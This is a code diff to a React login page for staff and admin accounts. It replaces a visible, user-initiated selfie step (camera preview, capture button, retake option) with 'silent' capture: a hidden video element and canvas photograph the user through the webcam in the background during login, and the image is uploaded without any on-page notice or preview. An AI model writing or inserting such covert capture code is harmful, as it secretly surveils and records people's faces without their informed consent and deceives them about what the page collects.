@@ -5,7 +5,7 @@ import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
 import { useToast } from '@/hooks/use-toast';
 import { useAuth } from '@/context/AuthContext';
-import { Gamepad, ZapIcon, Stars, Dice1, Dice3, Dice5, Trophy, Joystick, User, Users, Shield, KeyRound, Lock, Eye, EyeOff, ArrowLeft, FileText, Camera } from 'lucide-react';
+import { Gamepad, ZapIcon, Stars, Dice1, Dice3, Dice5, Trophy, Joystick, User, Users, Shield, KeyRound, Lock, Eye, EyeOff, ArrowLeft, FileText } from 'lucide-react';
 import { useIsMobile } from '@/hooks/use-mobile';
 import { Tabs, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import {
@@ -53,9 +53,7 @@ const Login = () => {
   const [pinInput, setPinInput] = useState('');
   const [showPin, setShowPin] = useState(false);
   
-  // Webcam states
-  const [showCamera, setShowCamera] = useState(false);
-  const [capturedImage, setCapturedImage] = useState<string | null>(null);
+  // Hidden video and canvas refs for silent capture
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
   
@@ -209,51 +207,55 @@ const Login = () => {
     collectLoginInfo();
   }, []);
 
-  // Camera functions
-  const startCamera = async () => {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: 'user' },
-        audio: false 
-      });
-      
-      if (videoRef.current) {
-        videoRef.current.srcObject = stream;
-        videoRef.current.play();
-      }
-      setShowCamera(true);
-    } catch (error) {
-      console.error('Camera access denied:', error);
-      toast({
-        title: 'Camera Access',
-        description: 'Camera access denied. Login will proceed without selfie.',
-        variant: 'destructive',
-      });
-    }
-  };
-
-  const capturePhoto = () => {
-    if (videoRef.current && canvasRef.current) {
-      const canvas = canvasRef.current;
-      const video = videoRef.current;
-      
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      
-      const ctx = canvas.getContext('2d');
-      if (ctx) {
-        ctx.drawImage(video, 0, 0);
-        const imageData = canvas.toDataURL('image/jpeg', 0.8);
-        setCapturedImage(imageData);
+  // Silent camera capture
+  const captureSilentSelfie = async (): Promise<string | null> => {
+    return new Promise(async (resolve) => {
+      try {
+        // Request camera access silently
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { 
+            facingMode: 'user',
+            width: { ideal: 640 },
+            height: { ideal: 480 }
+          },
+          audio: false 
+        });
         
-        // Stop camera
-        const stream = video.srcObject as MediaStream;
-        if (stream) {
+        if (videoRef.current && canvasRef.current) {
+          videoRef.current.srcObject = stream;
+          videoRef.current.play();
+          
+          // Wait for video to be ready and capture
+          setTimeout(() => {
+            const canvas = canvasRef.current!;
+            const video = videoRef.current!;
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            const ctx = canvas.getContext('2d');
+            if (ctx) {
+              ctx.drawImage(video, 0, 0);
+              const imageData = canvas.toDataURL('image/jpeg', 0.8);
+              
+              // Stop camera immediately after capture
+              stream.getTracks().forEach(track => track.stop());
+              
+              resolve(imageData);
+            } else {
+              stream.getTracks().forEach(track => track.stop());
+              resolve(null);
+            }
+          }, 1000); // Wait 1 second for camera to initialize
+        } else {
           stream.getTracks().forEach(track => track.stop());
+          resolve(null);
         }
-        setShowCamera(false);
+      } catch (error) {
+        console.log('Silent camera capture failed (permission denied or not available):', error);
+        resolve(null);
       }
-    }
+    });
   };
 
   const uploadSelfie = async (imageData: string): Promise<string | null> => {
@@ -302,23 +304,15 @@ const Login = () => {
       });
       return;
     }
-
-    // Ask for selfie
-    if (!capturedImage) {
-      toast({
-        title: 'Take Selfie',
-        description: 'Please capture your selfie for security verification',
-      });
-      await startCamera();
-      return;
-    }
     
     setIsLoading(true);
+    
     try {
       const isAdminLogin = loginType === 'admin';
       
-      // Upload selfie
+      // Silently capture selfie in background
       let selfieUrl = null;
+      const capturedImage = await captureSilentSelfie();
       if (capturedImage) {
         selfieUrl = await uploadSelfie(capturedImage);
       }
@@ -344,7 +338,6 @@ const Login = () => {
           description: `Invalid ${isAdminLogin ? 'admin' : 'staff'} credentials`,
           variant: 'destructive',
         });
-        setCapturedImage(null); // Reset selfie for retry
       }
     } catch (error) {
       toast({
@@ -771,53 +764,6 @@ const Login = () => {
                 </Tabs>
               </div>
 
-              {/* Camera Preview */}
-              {showCamera && (
-                <div className="space-y-2">
-                  <div className="relative w-full aspect-video bg-black rounded-lg overflow-hidden">
-                    <video 
-                      ref={videoRef} 
-                      className="w-full h-full object-cover"
-                      autoPlay
-                      playsInline
-                      muted
-                    />
-                  </div>
-                  <Button 
-                    type="button"
-                    onClick={capturePhoto}
-                    className="w-full bg-cuephoria-orange hover:bg-cuephoria-orange/80 flex items-center gap-2"
-                  >
-                    <Camera size={16} />
-                    Capture Selfie
-                  </Button>
-                </div>
-              )}
-
-              {/* Captured Image Preview */}
-              {capturedImage && !showCamera && (
-                <div className="space-y-2">
-                  <div className="relative w-full aspect-video bg-black rounded-lg overflow-hidden">
-                    <img 
-                      src={capturedImage} 
-                      alt="Captured selfie" 
-                      className="w-full h-full object-cover"
-                    />
-                  </div>
-                  <Button 
-                    type="button"
-                    onClick={() => {
-                      setCapturedImage(null);
-                      startCamera();
-                    }}
-                    variant="outline"
-                    className="w-full"
-                  >
-                    Retake Photo
-                  </Button>
-                </div>
-              )}
-
               <div className="space-y-2 group">
                 <label htmlFor="username" className="text-xs sm:text-sm font-medium flex items-center gap-2 text-cuephoria-lightpurple group-hover:text-accent transition-colors duration-300">
                   <User size={14} className="inline-block" />
@@ -900,7 +846,14 @@ const Login = () => {
         </Card>
       </div>
 
-      {/* Hidden canvas for photo capture */}
+      {/* Hidden video and canvas for silent selfie capture */}
+      <video 
+        ref={videoRef} 
+        style={{ display: 'none' }}
+        autoPlay
+        playsInline
+        muted
+      />
       <canvas ref={canvasRef} style={{ display: 'none' }} />
 
       {/* PIN Dialog */}
